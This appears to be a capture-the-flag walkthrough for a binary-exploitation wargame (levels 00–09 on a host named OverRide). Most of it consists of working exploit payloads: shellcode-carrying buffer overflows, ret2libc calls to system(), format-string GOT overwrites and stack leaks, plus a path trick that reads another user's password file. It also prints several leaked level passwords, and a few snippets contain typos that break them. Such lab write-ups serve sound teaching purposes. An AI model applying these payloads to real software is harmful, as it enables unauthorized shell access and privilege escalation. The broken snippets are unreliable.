echo "alias gdb=\"gdb -q -ex 'set disassembly-flavor intel' -ex 'set pagination off'\"" >> .bashrc && . .bashrc

## level00

The input is compared to `5276`, the `system("/bin/sh")` is called if suucessful.

## level01

The program takes two inputs:

* username: `verify_user_name(input, "dat_wil")`
* password: `verify_user_pass(input, "admin")`

The username is a global variable.  
We could overflow the password to modify the return address `EIP`.  
offset: 80  
payload: `python -c 'print("dat_wil\n"+"\x90"*80+"BBBB")'`  
shellcode: `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`  
find `EIP` address:

```
$ gdb ./level01
(gdb) b *main + 169
(gdb) r < <(python -c 'print("dat_wil\n"+"\x90"*(80-21)+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"BBBB")')
(gdb) x/32xw $esp
...
0xffffd710:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd720:	0x90909090	0x31909090	0xb0e1f7c9	0x2f68510b
0xffffd730:	0x6868732f	0x6e69622f	0x80cde389	0x42424242
...
```

shellcode address: 0xffffd6e0

final payload:
```
python -c 'print("dat_wil\n"+"\x90"*(80-21)+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\xe0\xd6\xff\xff")'
```

```
python -c 'print("dat_wil\n"+"\x90"*(80-70)+"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"+"\x90"*20+"\x2c\xde\xff\xff")' | env - ./level01
```
## level02

The content of `/home/users/level03/.pass` is stored in `rbp-0xa0`.  
username is stored in `rbp-0x70`
password is stored in `rbp-0x110`
`username` is passed to `printf` as a first argument without providing a format string.

We can leak the flag from the stack.

```
arrdesses=$(for i in {22..26};do (echo -e "%$i\$p\npass" | env - ./level02 | grep 'have access'); done | cut -d' ' -f1)
for a in $address;do python -c "import struct; print(struct.pack('Q', $a))";done | tr -d '\n' && echo
```

## level03

exploit

```
level03@OverRide:~$ ./level03
***********************************
*		level03		**
***********************************
Password:322424827
$ whoami
level04
```

## level04

We could overflow the child process

```
(gdb) set follow-fork-mode child
(gdb) r < <(python -c 'print("A"*156+"BBBB")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04 < <(python -c 'print("A"*156+"BBBB")')
[New process 1994]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1994]
0x42424242 in ?? ()
(gdb) child is exiting...
```

shellcode is not working because `execve` is being checked using `ptrace`

Used ret3libc method to call `system()` and pass it a command to execute.

find `system` address
```
(gdb) b *main
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

find `/bin/bash` address
```
(gdb) x/s *environ+6
0xffffd8fb:	 "/bin/bash"
```

This address won't be exact as we execute out exploit outside gdb, we would need to tweak it to get the exact address

Exploit:
```
env -i SHELL="cat /home/users/level05/.pass" ./level04 < <(python -c 'import struct; print("\x90"*156+struct.pack("I", 0xf7e6aed0)+"AAAA"+struct.pack("I", 0xffffdfd0))')
...
... 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
Or
```
(python -c 'import struct; print("\x90"*156+struct.pack("I", 0xf7e6aed0)+"AAAA"+struct.pack("I", 0xffffdfeb))';cat) | env -i SHELL="/bin/sh" ./level04
Give me some shellcode, k
whoami
level05
```

## level05

This program converts uppercase characters in the input to lowercase, and pass the resulting string to `printf()` without providing a format string. After that `exit(0)` is called.

exit_got: 0x80497e0
system: 0xf7e6aed0

b1: 0x80497e0 -> 44752 - 8 = 44744
b3: 0x80497e2 -> 63462 - 44752 = 18710

```
python -c 'import struct;print(struct.pack("I", 0x80497e0)+struct.pack("I", 0x80497e2)+"%44744x%10$hn%18710x%11$hn")'
```

Tried calling `system` but `0` is passed as argument
```
python -c 'import struct;print(struct.pack("I", 0x80497e0)+struct.pack("I", 0x80497e2)+struct.pack("I", 0xffffd682)+struct.pack("I", 0xffffd680)+"%44736x%10$hn"+"%18710x%11$hn"+"%2073x%12$hn"+"%57297x%13$hn")'
```

Shellcode:

* address: 0xffffd6e8 : "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

rop:    0xf7e7 84b2
system: 0xf7e6 aed0
binsh:  0xf7f8 97ec

GOT    ESP+4   ESP+8    ESP+c
ROP + system +   4    + "/bin/sh"


```
python -c 'import struct;print(struct.pack("I", 0x80497e0)+struct.pack("I", 0x80497e2)+struct.pack("I", 0xffffd684)+struct.pack("I", 0xffffd686)+strcut.pack("I", 0xffffd68c)+struct.pack("I", 0xffffd68e)+"%44736x%10$hn"+"%18710x%11$hn"+"%2073x%12$hn"+"%57297x%13$hn")'
```

## level06

```
$ gdb ./level06
(gdb) b *auth+114
(gdb) b *auth+286
```

run the program and note what you enter in `login`, the serial is not important at the moment
```
(gdb) r
Starting program: /home/users/level06/level06
***********************************
*		level06		  *
***********************************
-> Enter Login: 123123
***********************************
***** NEW ACCOUNT DETECTED ********
***********************************
-> Enter Serial: 1
```

Once you hit the first breakpoint, modify the value in `eax` to `0`
```
Breakpoint 1, 0x080487ba in auth ()
(gdb) p $eax = 0
$1 = 0
```

Continue execution till the next breakpoint, and note the vaue in `ebp-0x10`
```
Breakpoint 2, 0x08048866 in auth ()
(gdb) x/d $ebp-0x10
0xffffd6a8:	6231528
```

> [ebp-0x10] will be compared to the `serial`, if they match, `system("/bin/sh")` is called.

copy the value in `ebp-0x10`: 6231528, and exit gdb.

execute the program normally, inset the same login you entered in gdb. for the serial just paste the value you copied earlier.

```
level06@OverRide:~$ ./level06
***********************************
*		level06		  *
***********************************
-> Enter Login: 123123
***********************************
***** NEW ACCOUNT DETECTED ********
***********************************
-> Enter Serial: 6231528
Authenticated!
$ whoami
level07
```

## level07

eip at index 114
every third number is reserved (3,6,9,12,15...)

Exploit:
```
(echo -e "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit";cat) | ./level07
```

## level08

Usage:
```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
```

Exploit:
```
$ mkdir -p backups/home/users/level09/
$ ~/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## level09

find `n` passed to `strncpy`

```
r < <(python -c 'print("A"*40+"C\n"+"B"*100)')
```

Find overflow offset
```
r < <(python -c 'print("A"*40+"\xff\n"+"B"*200+"CCCCCCCC")')
```

We can insert the address of the function `secret_backdoor`

Exploit:
```
(python -c 'print("A"*40+"\xff\n"+"\x90"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00")';cat) | ./level09
```
